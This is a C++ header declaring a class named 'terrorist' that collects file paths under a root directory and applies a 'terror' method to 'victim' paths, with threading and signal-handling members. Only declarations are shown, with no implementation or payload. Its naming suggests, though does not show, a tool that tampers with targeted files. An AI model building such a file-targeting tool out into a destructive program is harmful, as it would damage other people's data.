#pragma once
#include <string>
#include <filesystem>
#include <vector>
#include <iostream>
#include <list>
#include <thread>
#include <fstream>
#include <mutex>
#include <csignal>

class terrorist{
public:
    terrorist(std::string main_victim);

//    ~terrorist() {
//        delete self_pointer;
//        self_pointer = nullptr;
//    }

    terrorist();

    static terrorist* get_self();

    std::string main_path;

    void execution();

    void test_execution();
private:
    static inline terrorist* self_pointer;

    std::list<std::string> victims;

    std::list<std::string> current_terrorism;

    auto get_iterator(const std::list<std::string> &list, const std::string &copy);

    std::vector<std::string> get_all_paths(std::string &root_path);

    void dir_work(std::string root_dir);

    void load_list();

    void terror(std::string &victim_path);

    std::mutex lock;

    static inline bool signal;

    static void signal_handler(int signum);

};

